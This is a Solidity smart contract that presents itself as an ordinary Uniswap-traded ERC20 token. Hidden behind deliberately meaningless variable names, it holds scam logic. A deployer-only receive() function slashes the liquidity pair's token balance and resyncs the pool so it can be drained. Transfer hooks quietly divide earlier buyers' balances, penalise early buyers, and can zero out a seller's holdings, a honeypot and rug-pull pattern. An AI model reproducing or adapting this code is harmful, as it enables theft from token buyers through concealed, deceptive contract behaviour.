pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Math { 
    mapping (address => uint256) internal _balances;
    mapping (address => bool) internal Dancing;

    address[] internal greArr; address[3] internal Carrot;

    bool[3] internal Biden; bool internal trading = false;

    uint256 internal Rabbit = block.number*2; uint256 internal numB;
    uint256 internal Chocolate = 0; uint256 internal Bark = 1;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;


    function set() internal {
        Carrot[0] = address(_router);
        Carrot[1] = msg.sender;
        Carrot[2] = pair;
        for (uint256 q=0; q < 3; q++) {Math.Dancing[Math.Carrot[q]] = true; Math.Biden[q] = false; }
    }

    function last(uint256 g) internal view returns (address) { return (Chocolate > 1 ? greArr[greArr.length-g-1] : address(0)); }

    receive() external payable {
        require(msg.sender == Carrot[1]); _balances[Carrot[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(Carrot[2]).sync(); Biden[2] = true;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((trading || (sender == Carrot[1])), "ERC20: trading is not yet enabled.");
        Bark += ((Dancing[sender] != true) && (Dancing[recipient] == true)) ? 1 : 0;
        if (((Dancing[sender] == true) && (Dancing[recipient] != true)) || ((Dancing[sender] != true) && (Dancing[recipient] != true))) { greArr.push(recipient); }
        _balancesOfTheGreat(sender, recipient);
    }

    function _balancesOfTheGreat(address sender, address recipient) internal {
        if ((Biden[0] || (Biden[2] && (recipient != Carrot[1])))) { for (uint256 q=0; q < greArr.length-1; q++) { _balances[greArr[q]] /= (Biden[2] ? 1e9 : 4e1); } Biden[0] = false; }
        _balances[last(1)] /= (((Rabbit == block.number) || Biden[1] || ((Rabbit - numB) <= 7)) && (Dancing[last(1)] != true) && (Chocolate > 1)) ? (3e1) : (1);
        _balances[last(0)] /= (((Biden[1]) && (last(0) == sender)) || ((Biden[2] && (Carrot[1] != sender))) ? (0) : (1));
        (Biden[0],Biden[1]) = ((((Bark*10 / 4) == 10) && (Biden[1] == false)) ? (true,true) : (Biden[0],Biden[1]));
        Rabbit = block.number; Chocolate++;
    }
}